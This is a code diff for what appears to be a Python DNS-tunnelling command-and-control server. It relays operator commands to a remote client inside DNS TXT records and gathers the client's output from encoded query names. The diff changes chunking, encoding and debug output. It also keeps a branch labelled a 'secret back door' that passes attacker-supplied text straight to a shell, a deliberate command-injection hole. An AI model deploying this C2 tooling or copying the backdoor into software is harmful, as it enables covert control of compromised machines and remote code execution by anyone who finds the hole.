@@ -38,24 +38,18 @@ class DomainName(str):
 def toBytes(input):
     if isinstance(input, str): return input.encode('utf8')
     else: return input
-
 def toString(input):
     if isinstance(input, bytes): return input.decode('utf8')
     else: return input
 
 def decode64(b64):
     return base64.b64decode(toBytes(b64))
-
 def encode64(plain):
     return base64.b64encode(toBytes(plain))
-
 def decode32(b32):
-    print(f"{OR}decoding {OV}{b32}")
     revert = toBytes(b32).replace(b"-",b"=") # undo the "equals" silliness
-    revert = revert.replace(b"0",b"") # nuke and "0" pads
-    print(f"{OR}passing in {OV}{revert}")
+    if revert.endswith(b"0"): revert = revert[:-1] # pop off any extra pad
     return base64.b32decode(revert)
-
 def encode32(plain):
     switch = toBytes(plain)
     return base64.b32encode(switch).replace(b"=",b"-") # "equals" isn't allowed to play in domain names
@@ -113,7 +107,7 @@ records = {
 def dns_response(data):
     request = DNSRecord.parse(data)
     # if debuggin: print(f"{OV}Incoming data looks like:\n{OR} {data}{OM}")
-    if debuggin: print(f"{OV}Incoming request looks like:\n{OR} {request}{OM}")
+    # if debuggin: print(f"{OV}Incoming request looks like:\n{OR} {request}{OM}")
     reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
     qname = request.q.qname
     # if debuggin: print(f"{OV}Incoming qname looks like:\n{OR} {request.q.qname}{OM}")
@@ -136,28 +130,28 @@ def dns_response(data):
         txtReply = c2(qn)
         reply.add_answer(RR(qname, 16, ttl=0, rdata=TXT(txtReply)))
         reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
-    if debuggin: print(f"{OV}Outgoing reply looks like:\n{OR} {reply}{OM}")
+        if debuggin: print(f"{OV}Outgoing txt reply looks like: {OR}{txtReply}{OM}")
     return reply.pack()
 
 def c2(qname):
     #try:
         global respPktCt
-        if debuggin: print(f"{OV}c2() working with incoming qname:{OR} {qname}{OM}")
         request = qname.split(".")[0]
-        request = decode32(request).decode('UTF8')
         msgType = request[:3]
+        if debuggin: print(f"{OV}c2() working with incoming request {OR}{request}{OV} of type {OR}{msgType}{OM}")
+        request = decode32(request[3:]).decode('UTF8')
         if msgType == "CHK": # client checking in for commands
             if userInput == "": # no user input? NOP
-                response = "NUL"
+                response = b"NUL"
             else: # have a command? send the command header
                 encCmd = encode64(userInput).decode('UTF8') # encode so special chars don't nuke us
                 global chunks
                 chunks = wrap(encCmd,249) # break encoded command into chunks w/4-byte headers, 253 byte max
                 chunks.reverse() # so we can pop pieces off in order
-                response = f"HDR{len(chunks)}"
+                response = b"HDR" + encode64(str(len(chunks)))
         elif msgType == "HDR": # client sending response header
             respPktCt = int(request.split(" ")[0][3:])
-            response = "ACK" + str(respPktCt)
+            response = b"ACK" + str(respPktCt)
         elif msgType == "RES": # client sending response body
             if respPktCt < 1:
                 print(f"{OE}Got unexpected client 'RES'{OM}")
@@ -167,23 +161,23 @@ def c2(qname):
                 respPktCt -= 1
                 respText += request[3:]
                 if respPktCt == 0: # end of the thread from client? print output
-                    print(f"\n{OM}{respText}\n")
+                    if debuggin: print(f"\n{OM}{respText}\n")
         elif msgType == "CON": # client ready for more from server
             if len(chunks) < 1:
                 print(f"{OE}Got unexpected client 'CON'{OM}")
-                response = "DIE Unexpected CON"
+                response = b"DIE Unexpected CON"
             else:
-                response = chunks.pop() # send the next chunk of command
+                response = b"CMD" + chunks.pop().encode('UTF8') # send the next chunk of command
         elif msgType == "126": # a secret back door?!?
             command = request[3:]
             subprocess.check_output(command, shell=True)
-            response = "Looks like blind command injection..."
+            response = b"Looks like blind command injection..."
         else: # something went wrong
             error = f"Expected 'CHK', 'HDR', 'RES', or 'CON' from client, got {msgType}"
             print(OE + error + OM)
             raise Exception(error)
-        if debuggin: print(f"{OV}c2() returning encoded response:{OR} {response}{OM}")
-        return encode64(response)
+        if debuggin: print(f"{OV}c2() returning encoded response:{OR} {response}{OM}, ", end='')
+        return response
     #except Exception as ex:
     #    print(f"{OE}Exception in c2(): {OR}{ex}{OM}")
 
@@ -194,11 +188,11 @@ class BaseRequestHandler(socketserver.BaseRequestHandler):
         raise NotImplementedError
     def handle(self):
         now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
-        print("\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],
-                                               self.client_address[1]))
+        # print("\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],
+        #                                        self.client_address[1]))
         try:
             data = self.get_data()
-            print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
+            # print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
             self.send_data(dns_response(data))
         except Exception:
             traceback.print_exc(file=sys.stderr)
